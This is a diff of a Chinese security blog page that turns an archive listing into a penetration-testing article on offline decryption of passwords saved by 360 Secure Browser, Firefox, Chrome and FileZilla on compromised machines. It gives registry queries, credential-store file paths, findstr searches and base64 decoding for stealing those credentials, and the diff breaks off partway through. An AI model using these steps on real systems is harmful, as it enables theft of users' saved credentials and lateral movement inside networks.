@@ -6,18 +6,82 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Archives | aingy’Blogs</title>
+  <title>内网软件密码离线解密 | aingy’Blogs</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="aingy’blogs 网络安全|WEB安全|渗透测试">
-<meta property="og:type" content="website">
-<meta property="og:title" content="aingy’Blogs">
-<meta property="og:url" content="http://example.com/archives/index.html">
+  <meta name="description" content="内网软件密码离线解密前言 目前随着企业人员安全意识的提高，在真实环境中进行内网横向时大部分情况会遇到防护软件，网上公开的大部分软件密码解密工具，都需要在被攻击者的机器上面运行，在此期间可能会涉及到运行环境、杀软等多种情况，导致解密失败。本文搜集并总结了下内网中比较常见的一些软件的离线解密方法，包括最新版本和旧版本，适用于部分条件较为苛刻的真实环境中。后续可以根据获得的足够多的密码样本来分析该机主的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网软件密码离线解密">
+<meta property="og:url" content="http://example.com/2022/10/18/%E5%86%85%E7%BD%91%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A6%BB%E7%BA%BF%E8%A7%A3%E5%AF%86/index.html">
 <meta property="og:site_name" content="aingy’Blogs">
-<meta property="og:description" content="aingy’blogs 网络安全|WEB安全|渗透测试">
+<meta property="og:description" content="内网软件密码离线解密前言 目前随着企业人员安全意识的提高，在真实环境中进行内网横向时大部分情况会遇到防护软件，网上公开的大部分软件密码解密工具，都需要在被攻击者的机器上面运行，在此期间可能会涉及到运行环境、杀软等多种情况，导致解密失败。本文搜集并总结了下内网中比较常见的一些软件的离线解密方法，包括最新版本和旧版本，适用于部分条件较为苛刻的真实环境中。后续可以根据获得的足够多的密码样本来分析该机主的">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16190566405232.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16190566761075.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16193286217252.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16190691853005.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16193287097687.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16191419286956.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16191419437314.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16190701346433.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16190702277927.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16193288683285.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16193289008107.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16190728117221.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16190734063390.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16190753798128.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16193289653089.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16193332396173.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16190906026405.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16190907706932.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16190908894155.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16193355710487.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16190931382803.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16194167134693.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16194167998608.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16190939628834.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16194208178640.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16194214790655.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16194217004652.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16194217440891.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16194217977249.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16200464706398.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16200879334942.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16200880438005.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16200881603120.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16200882731081.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16200883055209.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16202690577290.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16202711190909.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16202712078875.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16202712668116.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16202715317978.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16202715101016.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16202801240366.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16202808710763.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16202809315181.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16202808710763.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16202813515492.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16202813735710.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16202814043261.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16202813735710.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16202819782680.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16202850148353.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16202824848645.jpg">
+<meta property="og:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16202832950917.jpg">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrwwpeS8AyNibs8Kf9RH3jvZDaG8I9jjWudVHJ5dthZ8Sp569EibDl74B8HgIwl6AuzaHf93ibBWV6U9g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrwwpeS8AyNibs8Kf9RH3jvZDjRf5AaEfwrzsJzazeoliatHHYZZDeN3R80rYySicRD8icS7bzCFF5R94w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrwwpeS8AyNibs8Kf9RH3jvZDJ9bAoVhXpRvhEM3tgRcRUdUK6GFaib5tygN7FvPTNO3EqfHK8pAqPDw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrwwpeS8AyNibs8Kf9RH3jvZD3KfUWDricEQ3QgCVHW3vGesk6uucPc0wf8zQAW6lU2zdo9kdgicZgYcw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrwwpeS8AyNibs8Kf9RH3jvZD2zsVdP3cjaFa9N4mb2BsvspZ2mM2icSyliau22Yf4Us32QQvpI7zdThQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrwwpeS8AyNibs8Kf9RH3jvZDBvzbB7y7nZ06bnPZ3jwFdEuo3gw942K6NKqDG5DEwhI0cuHWN2rHQg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrwwpeS8AyNibs8Kf9RH3jvZDYicEYdgnZ03K9UPAHxc9ejuqcDHU9bF7icUQibZdqjeV7Njv30Sibq6aJg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrwwpeS8AyNibs8Kf9RH3jvZDjuicpnYseJXezSKHTEyWxOzMHk3G3ngtVmXpdqQJOmI8ic0VsygYzyDw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="article:published_time" content="2022-10-17T19:15:50.757Z">
+<meta property="article:modified_time" content="2024-06-12T17:14:28.123Z">
 <meta property="article:author" content="aingy">
 <meta property="article:tag" content="aingy’blogs 网络安全|WEB安全|渗透测试">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16190566405232.jpg">
   
     <link rel="alternative" href="/atom.xml" title="aingy’Blogs" type="application/atom+xml">
   
@@ -183,411 +247,223 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-内网软件密码离线解密" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2024" class="archive-year">2024</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2024/06/13/awvs%E6%8A%A5%E5%91%8A%E8%BD%AC%E5%8C%96%E5%B9%B3%E5%8F%B0%E5%BC%80%E5%8F%91/" class="archive-article-date">
-  	<time datetime="2024-06-12T17:06:13.617Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-06-13</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2024/06/13/awvs%E6%8A%A5%E5%91%8A%E8%BD%AC%E5%8C%96%E5%B9%B3%E5%8F%B0%E5%BC%80%E5%8F%91/">awvs报告转化平台开发</a>
+    <h1 class="article-title" itemprop="name">
+      内网软件密码离线解密
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/开发相关//" class="article-tag-list-link color5">开发相关</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/开发相关/python//" class="article-tag-list-link color2">python</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2024/04/28/Windows%E6%8F%90%E6%9D%83%E7%AC%94%E8%AE%B0/" class="archive-article-date">
-  	<time datetime="2024-04-28T15:13:31.162Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-04-28</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2024/04/28/Windows%E6%8F%90%E6%9D%83%E7%AC%94%E8%AE%B0/">Windows提权笔记</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/PententTest//" class="article-tag-list-link color2">PententTest</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-      
-        </div></section>
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2023" class="archive-year">2023</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2023/05/24/Redis%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/" class="archive-article-date">
-  	<time datetime="2023-05-24T14:36:55.468Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-05-24</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2023/05/24/Redis%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/">Redis利用方法整理</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/PententTest//" class="article-tag-list-link color2">PententTest</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2023/05/24/MySQL%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/" class="archive-article-date">
-  	<time datetime="2023-05-24T14:35:24.037Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-05-24</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2023/05/24/MySQL%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/">MySQL利用方法整理</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/PententTest//" class="article-tag-list-link color2">PententTest</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2023/02/25/Fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" class="archive-article-date">
-  	<time datetime="2023-02-24T16:22:24.362Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-02-25</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2023/02/25/Fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">命令执行漏洞总结</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/PententTest//" class="article-tag-list-link color2">PententTest</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2023/01/30/%E5%9C%A8IPA%E4%B8%AD%E9%87%8D%E7%AD%BE%E5%90%8DiOS%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/" class="archive-article-date">
-  	<time datetime="2023-01-30T11:44:10.069Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-01-30</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2023/01/30/%E5%9C%A8IPA%E4%B8%AD%E9%87%8D%E7%AD%BE%E5%90%8DiOS%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/">在IPA中重签名iOS应用程序</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/iosTest//" class="article-tag-list-link color3">iosTest</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-      
-        </div></section>
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2022" class="archive-year">2022</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/11/13/Vcenter%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/" class="archive-article-date">
-  	<time datetime="2022-11-13T14:25:40.427Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-11-13</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/11/13/Vcenter%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/">Vcenter实战利用方式总结</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/PententTest//" class="article-tag-list-link color2">PententTest</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/11/10/Elasticsearch%E5%9F%BA%E7%A1%80%EF%BC%88%E4%BA%8C%EF%BC%89/" class="archive-article-date">
-  	<time datetime="2022-11-10T13:49:47.499Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-11-10</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/11/10/Elasticsearch%E5%9F%BA%E7%A1%80%EF%BC%88%E4%BA%8C%EF%BC%89/">Elasticsearch基础（二）</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/开发相关//" class="article-tag-list-link color5">开发相关</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/开发相关/elk//" class="article-tag-list-link color4">elk</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/11/08/Elasticsearch%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%80%EF%BC%89/" class="archive-article-date">
-  	<time datetime="2022-11-08T15:06:47.472Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-11-08</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/11/08/Elasticsearch%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%80%EF%BC%89/">Elasticsearch基础（一）</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/开发相关//" class="article-tag-list-link color5">开发相关</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/开发相关/elk//" class="article-tag-list-link color4">elk</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/10/18/%E5%86%85%E7%BD%91%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A6%BB%E7%BA%BF%E8%A7%A3%E5%AF%86/" class="archive-article-date">
+        
+        <a href="/2022/10/18/%E5%86%85%E7%BD%91%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A6%BB%E7%BA%BF%E8%A7%A3%E5%AF%86/" class="archive-article-date">
   	<time datetime="2022-10-17T19:15:50.757Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-10-18</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/10/18/%E5%86%85%E7%BD%91%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A6%BB%E7%BA%BF%E8%A7%A3%E5%AF%86/">内网软件密码离线解密</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="内网软件密码离线解密"><a href="#内网软件密码离线解密" class="headerlink" title="内网软件密码离线解密"></a>内网软件密码离线解密</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+<p>目前随着企业人员安全意识的提高，在真实环境中进行内网横向时大部分情况会遇到防护软件，网上公开的大部分软件密码解密工具，都需要在被攻击者的机器上面运行，在此期间可能会涉及到运行环境、杀软等多种情况，导致解密失败。<br>本文搜集并总结了下内网中比较常见的一些软件的离线解密方法，包括最新版本和旧版本，适用于部分条件较为苛刻的真实环境中。后续可以根据获得的足够多的密码样本来分析该机主的密码设置方式和使用习惯，从而进行针对性的攻击利用。</p>
+</blockquote>
+<span id="more"></span> 
 
-        <div class="article-info info-on-right">
-          
-          
+<h2 id="360安全浏览器离线解密"><a href="#360安全浏览器离线解密" class="headerlink" title="360安全浏览器离线解密"></a>360安全浏览器离线解密</h2><p>首先切到指定用户权限下，获取机器id，把assis2.db账密数据库文件拖回本地执行解密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKLM\SOFTWARE\MICROSOFT\CRYPTOGRAPHY&quot; /v &quot;MachineGuid&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16190566405232.jpg" alt="-w645"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\tale\AppData\Roaming\360se6\User Data\Default\apps\LoginAssis</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16190566761075.jpg" alt="-w776"><br>执行解密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">360SafeBrowserDecrypt.exe 8efb8f7a-3ad6-4b78-b654-e4a433d76843 assis2.db</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16193286217252.jpg" alt="-w549"></p>
+<h2 id="Firefox-离线解密"><a href="#Firefox-离线解密" class="headerlink" title="Firefox 离线解密"></a>Firefox 离线解密</h2><p>打包firedox文件<br>C:\Users\tale\AppData\Roaming\Mozilla*.*<br>本地解密<br><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16190691853005.jpg" alt="-w760"><br>运行python firefox_decrypt.py<br>最后进行本地解密，如果对方没有设置管理密码，直接回车即可看到结果<br><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16193287097687.jpg" alt="-w556"><br>注：如直接从webshell或cs上打包，需切到指定用户权限下，关闭firefox进程。<br><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16191419286956.jpg" alt="-w512"><br>然后进行打包完整用户数据库并拖回本地<br><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16191419437314.jpg" alt="-w869"></p>
+<h2 id="Chrome-离线解密"><a href="#Chrome-离线解密" class="headerlink" title="Chrome 离线解密"></a>Chrome 离线解密</h2><p>条件:<br>1.用户明文的密码，用于解密加密密钥（可以利用Masterkey离线导出Chrome浏览器中保存的密码，不需要获得用户的明文口令）<br>2.加密密钥（即主密钥文件），位于％appdata％\Microsoft\Protect下对应sid文件夹下的文件<br>3.数据库文件登录数据即Login Data<br>4.Chrome密码还原工具ChromePass<br>下载地址<a target="_blank" rel="noopener" href="http://www.nirsoft.net/utils/chromepass.html">http://www.nirsoft.net/utils/chromepass.html</a></p>
+<p>加密密钥（即主密钥文件），位于％appdata％\Microsoft\Protect下对应sid文件夹下的文件<br>C:\Users\tale\AppData\Roaming\Microsoft\Protect<br><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16190701346433.jpg" alt="-w770"><br>数据库文件登录数据：<br>C:\Users\tale\AppData\Local\Google\Chrome\User Data\Default\Login Data<br><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16190702277927.jpg" alt="-w841"><br><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16193288683285.jpg" alt="-w537"><br><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16193289008107.jpg" alt="-w536"></p>
+<h2 id="FileZilla-客户端离线解密"><a href="#FileZilla-客户端离线解密" class="headerlink" title="FileZilla 客户端离线解密"></a>FileZilla 客户端离线解密</h2><p>filezilla 客户端的账密默认都是以base64存的，故解码下即可得到明文<br><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16190728117221.jpg" alt="-w1135"><br>存放路径C:\Users\tale\AppData\Roaming\FileZilla<br><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16190734063390.jpg" alt="-w910"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># dir %appdata%\FileZilla</span><br><span class="line"># cd C:\Users\tale\AppData\Roaming\FileZilla</span><br><span class="line"># findstr /c:&quot;&lt;Host&gt;&quot; /c:&quot;&lt;Port&gt;&quot; /c:&quot;&lt;User&gt;&quot; /c:&quot;&lt;Pass&quot; /si *.xml </span><br><span class="line"># echo dGlkZTEyMw== | base64 -d -i</span><br></pre></td></tr></table></figure>
+
